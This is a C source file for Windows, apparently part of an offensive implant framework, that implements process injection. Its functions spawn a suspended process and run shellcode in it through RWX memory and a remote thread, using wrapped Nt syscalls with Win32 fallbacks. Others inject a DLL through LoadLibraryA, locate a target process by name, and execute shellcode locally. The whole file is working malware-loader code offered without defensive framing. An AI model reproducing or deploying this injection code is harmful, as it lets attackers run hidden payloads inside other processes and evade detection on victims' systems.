#include "inject.h"
#include "engine.h"
#include "config.h"
#include <string.h>
#include <tlhelp32.h>

#ifdef ENABLE_PROCESS_INJECTION

inject_result_t inject_shellcode_to_target(const char *target_exe,
                                            const unsigned char *shellcode,
                                            size_t sc_len)
{
    inject_result_t res = {0};
    if (!target_exe || !shellcode || sc_len == 0) return res;

    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);

    if (!CreateProcessA(NULL, (char*)target_exe, NULL, NULL, FALSE,
                        CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        return res;
    }

    PVOID remote_addr = NULL;
    SIZE_T region_size = sc_len;
    NTSTATUS status = mirage_NtAllocateVirtualMemory(pi.hProcess, &remote_addr,
        0, &region_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (status < 0) {
        remote_addr = VirtualAllocEx(pi.hProcess, NULL, sc_len,
                                      MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    }

    if (!remote_addr) {
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return res;
    }

    SIZE_T bytes_written = 0;
    status = mirage_NtWriteVirtualMemory(pi.hProcess, remote_addr,
                                          (PVOID)shellcode, sc_len, &bytes_written);

    if (status < 0 || bytes_written != sc_len) {
        if (!WriteProcessMemory(pi.hProcess, remote_addr, shellcode, sc_len, &bytes_written) ||
            bytes_written != sc_len) {
            VirtualFreeEx(pi.hProcess, remote_addr, 0, MEM_RELEASE);
            TerminateProcess(pi.hProcess, 1);
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
            return res;
        }
    }

    HANDLE remote_thread = NULL;
    status = mirage_NtCreateThreadEx(&remote_thread, THREAD_ALL_ACCESS, NULL,
                                      pi.hProcess, remote_addr, NULL, 0,
                                      0, 0, 0, NULL);

    if (status < 0 || !remote_thread) {
        remote_thread = CreateRemoteThread(pi.hProcess, NULL, 0,
                                            (LPTHREAD_START_ROUTINE)remote_addr,
                                            NULL, 0, NULL);
    }

    if (!remote_thread) {
        VirtualFreeEx(pi.hProcess, remote_addr, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return res;
    }

    ResumeThread(pi.hThread);

    WaitForSingleObject(remote_thread, INFINITE);

    res.success = 1;
    res.target_pid = pi.dwProcessId;
    strncpy(res.target_name, target_exe, sizeof(res.target_name) - 1);

    mirage_NtClose(remote_thread);
    mirage_NtClose(pi.hThread);
    mirage_NtClose(pi.hProcess);

    return res;
}

inject_result_t inject_dll_to_pid(DWORD pid, const char *dll_path)
{
    inject_result_t res = {0};
    if (!pid || !dll_path) return res;

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) return res;

    size_t path_len = strlen(dll_path) + 1;
    PVOID remote_path = VirtualAllocEx(hProcess, NULL, path_len,
                                        MEM_COMMIT, PAGE_READWRITE);
    if (!remote_path) {
        CloseHandle(hProcess);
        return res;
    }

    SIZE_T written = 0;
    if (!WriteProcessMemory(hProcess, remote_path, dll_path, path_len, &written) ||
        written != path_len) {
        VirtualFreeEx(hProcess, remote_path, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return res;
    }

    HMODULE kernel32 = GetModuleHandleA("kernel32.dll");
    if (!kernel32) {
        VirtualFreeEx(hProcess, remote_path, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return res;
    }

    FARPROC loadlib = GetProcAddress(kernel32, "LoadLibraryA");
    if (!loadlib) {
        VirtualFreeEx(hProcess, remote_path, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return res;
    }

    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
                                         (LPTHREAD_START_ROUTINE)loadlib,
                                         remote_path, 0, NULL);
    if (!hThread) {
        VirtualFreeEx(hProcess, remote_path, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return res;
    }

    WaitForSingleObject(hThread, INFINITE);

    DWORD exit_code = 0;
    GetExitCodeThread(hThread, &exit_code);

    res.success = (exit_code != 0) ? 1 : 0;
    res.target_pid = pid;

    CloseHandle(hThread);
    VirtualFreeEx(hProcess, remote_path, 0, MEM_RELEASE);
    CloseHandle(hProcess);

    return res;
}

DWORD inject_find_process(const char *name)
{
    if (!name) return 0;

    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32 pe = {0};
    pe.dwSize = sizeof(pe);

    DWORD pid = 0;
    if (Process32First(snap, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, name) == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32Next(snap, &pe));
    }

    CloseHandle(snap);
    return pid;
}

int inject_execute_local(const unsigned char *shellcode, size_t sc_len)
{
    if (!shellcode || sc_len == 0) return -1;

    PVOID exec = VirtualAlloc(NULL, sc_len, MEM_COMMIT | MEM_RESERVE,
                               PAGE_EXECUTE_READWRITE);
    if (!exec) return -1;

    memcpy(exec, shellcode, sc_len);

    int (*code)(void) = (int (*)(void))exec;
    int ret = code();

    VirtualFree(exec, 0, MEM_RELEASE);
    return ret;
}

#endif /* ENABLE_PROCESS_INJECTION */
